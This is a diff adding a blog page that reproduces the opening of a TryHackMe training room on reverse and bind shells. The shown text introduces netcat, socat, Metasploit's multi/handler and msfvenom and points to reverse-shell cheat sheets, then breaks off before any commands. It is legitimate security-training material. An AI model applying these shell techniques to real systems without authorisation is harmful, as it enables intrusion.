@@ -1,0 +1,834 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>【THM】What the Shell?-Learn | 嘻哈磕碜のBlogs</title><meta name="author" content="hihopkc"><meta name="copyright" content="hihopkc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="【THM】What the Shell?-Learn"><meta name="application-name" content="【THM】What the Shell?-Learn"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="【THM】What the Shell?-Learn"><meta property="og:url" content="https://hihopkc.github.io/posts/eb53.html"><meta property="og:site_name" content="嘻哈磕碜のBlogs"><meta property="og:description" content="What is a shell?Before we can get into the intricacies of sending and receiving shells, it’s important to understand what a shell actually is. In the"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202028659.png"><meta property="article:author" content="hihopkc"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202028659.png"><meta name="description" content="What is a shell?Before we can get into the intricacies of sending and receiving shells, it’s important to understand what a shell actually is. In the"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://hihopkc.github.io/posts/eb53"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"tianli","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"00af80c1b4c617346c21","Referer":"https://hihopkc.github.io/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: 'https://hihopkc.space/',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: {"apiurl":"https://www.hihopkc.site/"},
+  navMusic: false,
+  mainTone: undefined,
+  authorStatus: {"skills":null},
+  algolia: {"appId":"R27EJ0K44Q","apiKey":"2631264c2276b5498f37a67d587bc878","indexName":"Demo","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hihopkc","link":"链接: ","source":"来源: 嘻哈磕碜のBlogs","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#425AEF","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: '嘻哈磕碜のBlogs',
+  title: '【THM】What the Shell?-Learn',
+  postAI: '',
+  pageFillDescription: 'What is a shell?, Tools, Netcat, Socat, Metasploit – multix2Fhandler, Msfvenom, Types of shell, Reverse Shell example, Bind Shell example, Netcat, Reverse Shells, Bind Shells, Netcat Shell Stabilisation, Technique 1 Python, Technique 2 rlwrap, Technique 3 Socat, Socat, Reverse Shells, Bind Shells, Socat Encrypted Shells, Answer the questions below, Common Shell Payloads, msfvenom, Staged vs Stageless, Meterpreter, Payload Naming Conventions, Metasploit multix2Fhandler, WebShells, Next Steps在这里您可以看到它以交互方式询问用户键入是或否以继续连接这是一个交互式程序需要交互式才能运行',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-12-21 00:18:50',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">嘻哈磕碜のBlogs</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="wechat" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="alipay" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/ChatGpt/" style="font-size: 1.05rem;">ChatGpt<sup>2</sup></a><a href="/tags/Java/" style="font-size: 1.05rem;">Java<sup>1</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>2</sup></a><a href="/tags/MSF/" style="font-size: 1.05rem;">MSF<sup>1</sup></a><a href="/tags/Navicat/" style="font-size: 1.05rem;">Navicat<sup>1</sup></a><a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">Web安全<sup>9</sup></a><a href="/tags/binwalk/" style="font-size: 1.05rem;">binwalk<sup>1</sup></a><a href="/tags/docker/" style="font-size: 1.05rem;">docker<sup>4</sup></a><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>1</sup></a><a href="/tags/mysql/" style="font-size: 1.05rem;">mysql<sup>1</sup></a><a href="/tags/oracle/" style="font-size: 1.05rem;">oracle<sup>1</sup></a><a href="/tags/owasp/" style="font-size: 1.05rem;">owasp<sup>1</sup></a><a href="/tags/phpstudy/" style="font-size: 1.05rem;">phpstudy<sup>1</sup></a><a href="/tags/python/" style="font-size: 1.05rem;">python<sup>1</sup></a><a href="/tags/redis/" style="font-size: 1.05rem;">redis<sup>1</sup></a><a href="/tags/shiro/" style="font-size: 1.05rem;">shiro<sup>1</sup></a><a href="/tags/sql/" style="font-size: 1.05rem;">sql<sup>1</sup></a><a href="/tags/ssrf/" style="font-size: 1.05rem;">ssrf<sup>1</sup></a><a href="/tags/xss/" style="font-size: 1.05rem;">xss<sup>2</sup></a><a href="/tags/%E5%AE%B9%E5%99%A8/" style="font-size: 1.05rem;">容器<sup>1</sup></a><a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 1.05rem;">护网<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.05rem;">数据库<sup>2</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">测试工具<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/12/"><span class="card-archive-list-date">十二月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">14</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">13</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">10</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">五月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">10</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/TryHackMe/" itemprop="url">TryHackMe</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/TryHackMe/Learn/" itemprop="url">Learn</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">【THM】What the Shell?-Learn</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-12-20T12:27:44.000Z" title="发表于 2023-12-20 20:27:44">2023-12-20</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-12-20T16:18:50.702Z" title="更新于 2023-12-21 00:18:50">2023-12-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">7.2k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>44分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="【THM】What the Shell?-Learn"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为东莞"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>东莞</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202312202028659.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://hihopkc.github.io/posts/eb53.html"><header><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/TryHackMe/" itemprop="url">TryHackMe</a><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/TryHackMe/Learn/" itemprop="url">Learn</a><h1 id="CrawlerTitle" itemprop="name headline">【THM】What the Shell?-Learn</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hihopkc</span><time itemprop="dateCreated datePublished" datetime="2023-12-20T12:27:44.000Z" title="发表于 2023-12-20 20:27:44">2023-12-20</time><time itemprop="dateCreated datePublished" datetime="2023-12-20T16:18:50.702Z" title="更新于 2023-12-21 00:18:50">2023-12-21</time></header><h1 id="What-is-a-shell"><a href="#What-is-a-shell" class="headerlink" title="What is a shell?"></a>What is a shell?</h1><p>Before we can get into the intricacies of sending and receiving shells, it’s important to understand what a shell actually <em>is.</em> In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.</p>
+<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><p>There are a variety of tools that we will be using to receive reverse shells and to send bind shells. In general terms, we need malicious shell code, as well as a way of interfacing with the resulting shell. We will discuss each of these briefly below:</p>
+<hr>
+<h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat:"></a><strong>Netcat:</strong></h2><p>Netcat is the traditional “Swiss Army Knife” of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques that we will be covering in an upcoming task.</p>
+<h2 id="Socat"><a href="#Socat" class="headerlink" title="Socat:"></a><strong>Socat:</strong></h2><p>Socat is like netcat on steroids. It can do all of the same things, and <em>many</em> more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:</p>
+<ol>
+<li>The syntax is more difficult</li>
+<li>Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.</li>
+</ol>
+<p>There are work arounds to both of these problems, which we will cover later on.</p>
+<p>Both Socat and Netcat have .exe versions for use on Windows.</p>
+<h2 id="Metasploit-–-multi-handler"><a href="#Metasploit-–-multi-handler" class="headerlink" title="Metasploit – multi&#x2F;handler:"></a><strong>Metasploit – multi&#x2F;handler:</strong></h2><p>The <code>exploit/multi/handler</code> module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Due to being part of the Metasploit framework, multi&#x2F;handler provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It’s also the only way to interact with a <em>meterpreter</em> shell, and is the easiest way to handle <em>staged</em> payloads.</p>
+<h2 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom:"></a><strong>Msfvenom:</strong></h2><p>Like multi&#x2F;handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Whilst msfvenom can generate payloads other than reverse and bind shells, these are what we will be focusing on in this room. Msfvenom is an incredibly powerful tool, so we will go into its application in much more detail in a dedicated task.</p>
+<hr>
+<p>Aside from the tools we’ve already covered, there are some repositories of shells in many different languages. One of the most prominent of these is [Payloads all the Things](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources&#x2F;Reverse Shell Cheatsheet.md). The PentestMonkey <a target="_blank" rel="noopener" href="https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheatsheet</a> is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of webshells located at <code>/usr/share/webshells</code>. The <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">SecLists repo</a>, though primarily used for wordlists, also contains some very useful code for obtaining shells.</p>
+<h1 id="Types-of-shell"><a href="#Types-of-shell" class="headerlink" title="Types of shell"></a>Types of shell</h1><p>At a high level, we are interested in two kinds of shell when it comes to exploiting a target: Reverse shells, and bind shells.</p>
+<ul>
+<li><strong>Reverse shells</strong> are when the target is forced to execute code that connects <em>back</em> to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a <em>listener</em> which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.</li>
+<li><strong>Bind shells</strong> are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.</li>
+</ul>
+<p>As a general rule, reverse shells are easier to execute and debug, however, we will cover both examples below. Don’t worry too much about the syntax here: we will be looking at it in upcoming tasks. Instead notice the difference between reverse and bind shells in the following simulations.</p>
+<h2 id="Reverse-Shell-example"><a href="#Reverse-Shell-example" class="headerlink" title="Reverse Shell example:"></a><em>Reverse Shell example:</em></h2><p>Let’s start with the more common reverse shell.</p>
+<p>Nine times out of ten, this is what you’ll be going for – especially in CTF challenges like those of TryHackMe.</p>
+<p>Take a look at the following image. On the left we have a reverse shell listener – this is what receives the connection. On the right is a simulation of sending a reverse shell. In reality, this is more likely to be done through code injection on a remote website or something along those lines. Picture the image on the left as being your own computer, and the image on the right as being the target.</p>
+<p>On the attacking machine:</p>
